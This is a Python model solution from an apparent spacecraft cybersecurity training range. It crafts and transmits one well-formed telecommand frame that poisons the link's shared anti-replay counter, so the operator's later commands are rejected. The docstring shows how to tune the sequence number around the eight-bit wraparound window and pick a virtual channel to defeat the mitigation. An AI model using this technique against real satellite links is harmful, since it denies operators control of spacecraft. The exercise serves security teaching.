"""EX-G03 model solution: silence a spacecraft with one well-formed frame.

The smallest attack in this range. No forged command, no privileged service, no overflow, no
captured traffic to replay. One frame, addressed to the right spacecraft, carrying a sequence
number ahead of the operator's - and from then on every command the operator sends is rejected as
a replay of something that never happened.

EX-L01's mitigation stops a recording being retransmitted by refusing any frame whose sequence
number is not strictly ahead of the last one accepted. One counter, for the whole link. That is
correct for exactly as long as the link has one transmitter on it.

    python3 exercises/EX-G03-one-counter-two-stations/solve.py --seq 200

WHAT MAKES THIS DIFFERENT FROM JAMMING: nothing is drowned out. The operator's frames arrive
intact, pass their CRC, and are discarded by the spacecraft's own defence. The console says
REJECTED replayed frame, so the operator goes looking for an attacker who is replaying - and
nobody is.

YOU CANNOT JUST CLAIM 255, and finding that out is worth the detour. The check compares
`(int8_t)(seq - last_seq)` so the counter can wrap, which means it is a circular window of +-127
rather than an ordering. With the operator at sequence 1, a frame claiming 200 computes to +57 -
"ahead" - and is accepted, and then the operator's next frame, 2, computes to -98 against 200 and
is rejected... but 200 is so far ahead that the operator walks back into the window within a
handful of commands. Claim 100 instead and they are locked out for ninety-nine of them.

The first version of this attack used 200 and the operator kept working. That is the eight-bit
window EX-L01's mitigation notes call small, made concrete: a defence that wraps has no "far
ahead", only "ahead until it is behind again".

WHICH VIRTUAL CHANNEL, AND WHY IT DECIDES EVERYTHING. The default here is VC 1, which is NOT the
operator's. On the vulnerable build that does not matter in the slightest: one counter serves the
whole link, so a frame on any channel silences every channel. That is the defect, and it is why
the backup station - a real site doing real work on VC 1 - locks the primary out just by
existing.

On the mitigated build, VC 1 poisons VC 1 and nothing else. Pass `--vcid 0` and the attack works
again, because the VCID is a plaintext field and nothing authenticates who may use it. The fix
raises the cost from "transmit anything" to "transmit on the operator's own channel". Real, and
small - the same shape of improvement EX-L01 and EX-G02 each end on, for the same reason: none of
these frames are authenticated. See mitigation.md.
"""
import argparse
import sys
import time
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO / "src"))

from cuberange.gs.link import SpaceLink                           # noqa: E402
from cuberange.identity import GROUND_SOURCE_ID, spacecraft       # noqa: E402
from cuberange.ports import channel as channel_port               # noqa: E402
from cuberange.proto.frame import encode_tc_frame                 # noqa: E402
from cuberange.proto.pus import PusTc                             # noqa: E402
from cuberange.proto.spacepacket import PacketType, SpacePacket   # noqa: E402

SERVICE_TEST, SUBTYPE_TEST = 17, 1


def poison(seq: int, satellite: int = 0, vcid: int = 0) -> bytes:
    """A frame that is wrong in no way except when it claims to be.

    Service 17,1 - a connection test, the most harmless thing a ground station sends. It is not
    the content that does the damage. It is the sequence number.
    """
    sat = spacecraft(satellite)
    tc = PusTc(service=SERVICE_TEST, subtype=SUBTYPE_TEST, source_id=GROUND_SOURCE_ID)
    packet = SpacePacket(apid=sat.apid, ptype=PacketType.TC, sec_hdr=True,
                         seq_count=seq & 0x3FFF, data=tc.encode())
    return encode_tc_frame(packet.encode(), seq=seq & 0xFF, scid=sat.scid, vcid=vcid)


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--seq", type=int, default=100,
                    help="the sequence number to claim; ahead of the operator, but see the note "
                         "about the window - too far ahead wraps to behind")
    ap.add_argument("--vcid", type=int, default=1,
                    help="the virtual channel to transmit on (default 1, NOT the operator's)")
    ap.add_argument("--satellite", type=int, default=0)
    ap.add_argument("--port", type=int, default=None, help="channel port to transmit through")
    args = ap.parse_args()

    frame = poison(args.seq, args.satellite, args.vcid)
    port = args.port if args.port is not None else channel_port(args.satellite)
    print(f"one frame, PUS 17,1, sequence {args.seq}, virtual channel {args.vcid}")
    print(f"  {frame.hex().upper()}")

    link = SpaceLink(port=port)
    link.connect(retries=60)
    try:
        link.send_frame(frame)
        time.sleep(1.0)
    finally:
        link.close()

    print("sent. The spacecraft accepted it, because it is a perfectly good frame.")
    print(f"On a link with one counter, VC {args.vcid} has just silenced every other channel.")
    print("Watch the operator's console: their next command is REJECTED as a replay, and they")
    print("have no way to tell that from someone actually replaying.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
